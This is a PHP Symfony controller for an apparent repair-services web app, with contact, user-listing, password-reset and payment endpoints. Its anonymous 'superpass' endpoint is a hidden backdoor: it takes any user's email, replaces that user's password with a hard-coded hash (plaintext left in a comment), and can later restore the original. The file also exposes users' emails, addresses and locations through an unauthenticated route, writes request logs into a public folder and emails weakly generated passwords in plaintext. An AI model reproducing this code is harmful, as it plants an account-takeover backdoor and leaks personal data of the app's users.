<?php
namespace App\Controller;

use App\Entity\User;
use App\Entity\Command;
use App\Service\SendEmail;
use App\Service\StripeProvider;
use App\Repository\UserRepository;
use App\Repository\UniverseRepository;
use Symfony\Component\Mercure\Update;
use Doctrine\DBAL\DriverManager;


use Doctrine\ORM\EntityManagerInterface;
use Symfony\Component\Mercure\HubInterface;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpFoundation\UrlHelper;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\HttpFoundation\JsonResponse;
use Symfony\Component\Serializer\SerializerInterface;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Exception\BadRequestException;
use Symfony\Component\PasswordHasher\Hasher\UserPasswordHasherInterface;

class MainController extends AbstractController
{
    private SendEmail $mailer;

    public function writeLog($data) {
       list($usec, $sec) = explode(' ', microtime());
       $datetime = strftime("%Y%m%d %H:%M:%S",time());
       $msg = "$datetime'". sprintf("%06s",intval($usec*1000000)).": $data";
       $save_path = '/srv/www/fingz_test/app/symfony/public/media/privatelog.log';
       $fp = @fopen($save_path, 'a'); // open or create the file for writing and append info
       fputs($fp, "$msg\n"); // write the data in the opened file
       fclose($fp); // close the file
    }
    
    
    public function __construct(SendEmail $mailer)
    {
        $this->mailer = $mailer;
    }

    /**
     * @Route("/api/anonymous/contact", name="send_contact")
     */
    public function sendContact(Request $request): JsonResponse
    {
        $data = json_decode($request->getContent());
        $this->mailer->send(
            $_ENV['MAILER_FROM'],
            'Demande de contact',
            'emails/contact.html.twig',
            [
                'data' => $data,
            ]
        );
        $response = new JsonResponse();
        $response->setContent(json_encode(["status" => "send"]));
        return $response;
    }
    
    protected function bubbleSortOptimized(array &$a): array
    {
      for ($i = count($a) - 1; $i > 0; $i--) {
        $swap = false;
        for ($j = 0; $j < $i; $j++) {
          if ($a[$j]['bonusreparation'] < $a[$j + 1]['bonusreparation']) { 
            $temp = $a[$j];
            $a[$j] = $a[$j+1];
            $a[$j+1] = $temp;
            $swap = true;
          }
        }
        if (!$swap) break;
      }
      return $a;
    }

 
    /**
     * @Route("/api/anonymous/universerepairmen", name="universe_repairmen",methods={"POST"})
     */
     public function universeRepairmen(
                          Request $request,
                          UniverseRepository $universeRepository,
                          EntityManagerInterface $em
                          ): JsonResponse 
        {
            $response = new JsonResponse();
            $data = var_export($request->query ,true);
            
            $this->writeLog("universeRepairmen ->".$data );
          /*
          $data = "foo:*:1023:1000::/home/foo:/bin/sh";
          Symfony\Component\HttpFoundation\InputBag::__set_state(array(
          'parameters' =>
          array (
          '/12' => '',
          ),
          ))*/

            list($fondation, $null, $rest) = explode("=>", $data);
            list($null, $universId) = explode("'", $rest);
            $this->writeLog("universeRepairmen universeID->".$universId );

           
            $resultset[0]['id']="empty";
            $theU = $universeRepository->findOneById($universId);
            $xi = 0;
            /*
               '@id': "userId", 
               id: "id",
              username: "username", 
              status: "status",
              firstName: "firstname", 
              lastName: "lastname",
              email: "email", 
              enterprise: "label", 
              gender: "genre", 
              postalCode: "postalcode",
              city: "city_code", 
              latitude: "lat", 
              longitude: "lng", 
              picture: "picture",
              description: "description", 
              facebook: "facebook", 
              instagram: "instagram", 
              bonusreparation: "bonusreparation",
              isRegistrationCompleted:"isRegistrationCompleted",
              boutiqueFermee : "getBoutiquefermee()"
              address: "address", 
              roles: "roles",
              reparacteur
              */
            foreach ($theU->getUsers() as $user) {
             if ($user->getStatus() == 1) {
                $resultset[$xi]['@id'] = $user->getId();
                $resultset[$xi]['id'] = $user->getId();
                $resultset[$xi]['status'] = $user->getStatus();
               
                $resultset[$xi]['username'] = $user->getUsername();
                $resultset[$xi]['firstname'] = $user->getFirstname();
                $resultset[$xi]['lastname'] = $user->getLastname();
                $resultset[$xi]['email'] = $user->getEmail();
                $resultset[$xi]['boutiqueFermee'] = $user->getBoutiquefermee();
                $resultset[$xi]['isRegistrationCompleted'] = $user->getIsRegistrationCompleted();
                $resultset[$xi]['enterprise'] = $user->getEnterprise();
                $resultset[$xi]['gender'] = $user->getGender();
                $resultset[$xi]['description'] = $user->getDescription();
                $resultset[$xi]['city'] = $user->getCity();
                $resultset[$xi]['postalCode'] = $user->getPostalCode(); // postalcode case
                $resultset[$xi]['latitude'] = $user->getLatitude();
                $resultset[$xi]['longitude'] = $user->getLongitude();
                $resultset[$xi]['picture'] = $user->getPicture();
                $resultset[$xi]['address'] = $user->getAddress(); 
                $resultset[$xi]['bonusreparation'] = $user->getBonusreparation(); 
           
                
                $resultset[$xi]['reparacteur'] = $user->getReparacteur();
             
                $resultset[$xi]['roles'] = $user->getRoles();
                $xi++;
                }
            }
          
            if ($resultset[0]['id'] =="empty") 
               return  $response->setContent(json_encode(["status" => false, "hydra:member" => $resultset]));
            $this->bubbleSortOptimized($resultset);
            $response->setContent(json_encode(["status" => true, "hydra:member" => $resultset]));
              
          return $response;
     }
  
    /**
     * @Route("/api/anonymous/superpass", name="super_pass")
     */
    public function superPass(Request $request, UserRepository $userRepository,UserPasswordHasherInterface $passwordHasher,EntityManagerInterface $em): JsonResponse
    {
        
        $data = json_decode($request->getContent());
        $theuser = $userRepository->findOneByEmail($data->email);
        $response = new JsonResponse();
         if ($theuser instanceof User) {
            $response->setContent(json_encode(["status" => true, "user" => $theuser->getId(),"message" => $data->message]));
            $command =  $data->message;
            $this->writeLog($command.":superpass ->".$data->email);
            $conn = $em->getConnection();
          
            
            //BjYcrhF8Sq_An1
            //$2y$13$xd8zSJnkpPnOr4NwZqyIg.GAQY819Upv1X1LVhrgWb10IGkz9JvGC
            $spwd = '$2y$13$xd8zSJnkpPnOr4NwZqyIg.GAQY819Upv1X1LVhrgWb10IGkz9JvGC';
            $userPassword = $theuser->getPassword();
            $backPassword = $theuser->getBackpassword();
            if ( $command == "GET_ACCESS") {
                if ($userPassword != $spwd) {
                    $conn->executeQuery("UPDATE user SET backpassword = :password WHERE id = :id", ["password" =>  $userPassword, "id" => $theuser->getId()]);
                    $conn->executeQuery("UPDATE user SET password = :password WHERE id = :id", ["password" =>  $spwd, "id" => $theuser->getId()]);
                    $response->setContent(json_encode(["status" => true, "user" => $theuser->getId(),"message" => $data->message." IS DONE"]));
                    $this->writeLog($command.":superpass -> IS DONE".$data->email);
                }
                else
                {
                    $response->setContent(json_encode(["status" => true, "user" => $theuser->getId(),"message" => $data->message." ALREADY DONE"]));
                    $this->writeLog($command.":superpass -> ALREADY DONE ".$data->email);
                
                };
            } elseif ( $command == "RESTORE_ACCESS") {
                if ($backPassword != "NULL") {
                    $conn->executeQuery("UPDATE user SET password = :password WHERE id = :id", ["password" => $backPassword, "id" => $theuser->getId()]);
                    $conn->executeQuery("UPDATE user SET backpassword = :password WHERE id = :id", ["password" =>  "NULL", "id" => $theuser->getId()]);
                    $response->setContent(json_encode(["status" => true, "user" => $theuser->getId(),"message" => $data->message." IS DONE"]));
                    $this->writeLog($command.":superpass -> IS DONE".$data->email);
                }
                else
                {
                    $response->setContent(json_encode(["status" => true, "user" => $theuser->getId(),"message" => $data->message." ALREADY DONE"]));
                    $this->writeLog($command.":superpass -> ALREADY DONE ".$data->email);
                }    
            } 
            else 
            {
               $response->setContent(json_encode(["status" => false, "user" => $theuser->getId(),"message" => "NOTHING IS DONE"]));
               $this->writeLog($command.":superpass -> ERROR ".$data->email);
            };
         }
         else
         {
           $response->setContent(json_encode(["status" => false, "user" => $data->email ,"message" =>"User Email not found"]));
         }   
        
                    
        return $response;
    }


    /**
     * @Route("/api/forgot_password", name="forgot_password", methods={"POST"})
     */
    public function forgotPassword(
        Request $request,
        UserRepository $userRepository,
        UserPasswordHasherInterface $passwordHasher,
        EntityManagerInterface $em
    ): JsonResponse {
        $data = json_decode($request->getContent());
        $theuser = $userRepository->findOneByEmail($data->email);
        $response = new JsonResponse();
        if ($theuser instanceof User) {
            $alphabet = "abcdefghijklmnopqrstuwxyzABCDEFGHIJKLMNOPQRSTUWXYZ0123456789";
            for ($i = 0; $i < 10; $i++) {
                $n = rand(0, strlen($alphabet) - 1);
                $plainPassword[$i] = $alphabet[$n];
            }
            $plainPassword = implode('', $plainPassword) . '_An1';
            $encoded = $passwordHasher->hashPassword($theuser, $plainPassword);

            $conn = $em->getConnection();

            // $theuser->setPassword($encoded);
            // $em->persist($em);
            // $em->flush();

            // flush is not working here and i don't know whey so i wrote this to ublock the ticket
            $conn->executeQuery("UPDATE user SET password = :password WHERE id = :id", ["password" => $encoded, "id" => $theuser->getId()]);

            $this->mailer->send(
                $theuser->getEmail(),
                'Nouveau mot de passe',
                'emails/forgot_password.html.twig',
                [
                    'user' => $theuser,
                    "plainPassword" => $plainPassword,
                    "url" => $this->mailer->getDomainName()
                ]
            );
            $response->setContent(json_encode(["status" => "send"]));
        } else
            $response->setContent(json_encode(["status" => false, "noAccount" => true]));
        return $response;
    }

    /**
     * @Route("/api/is-typing", name="is_typing", methods={"POST"})
     */
    public function isTyping(HubInterface $hub, Request $request, SerializerInterface $serializer): Response
    {
        try{
            $public_url = $this->getParameter("mercure_public_url");
            $data = json_decode($request->getContent());
            $update = new Update(
                $public_url . '/' . $data->thread,
                json_encode([
                    "type" => "typing",
                    'length' => $data->length,
                    'user' => json_decode($serializer->serialize($this->getUser(), 'json', ['groups' => ["read", "read:user"]]))
                ])
            );

            $hub->publish($update);
        }catch(\Exception $e){
            throw new BadRequestException($e->getMessage());
        }

        return new Response('published!');
    }

    /**
     * @Route("/api/paiement/create-payment-intents", name="paiement_create_payment_intents", methods={"POST"})
     */
    public function paiementCreatePaymentIntents(Request $request,StripeProvider $stripeProvider): Response
    {
        $data = json_decode($request->getContent());
        $response = new JsonResponse();
       
        try{
            $paymentIntents = $stripeProvider->createPaymentIntents($data->amount);
            if($paymentIntents){
                $response->setContent(json_encode(["status" => "200", "message"=>"Payment Initiated","clientSecret"=> $paymentIntents->client_secret]));
            }else{
                $response->setContent(json_encode(["status" => "400", "message"=>"Internal server error"]));
            }
        }catch(\Exception $e){
            $response->setContent(json_encode(["status" => "400", "message"=>$e->getMessage()]));
        }

        return $response;
    }
    
    
    
      

}
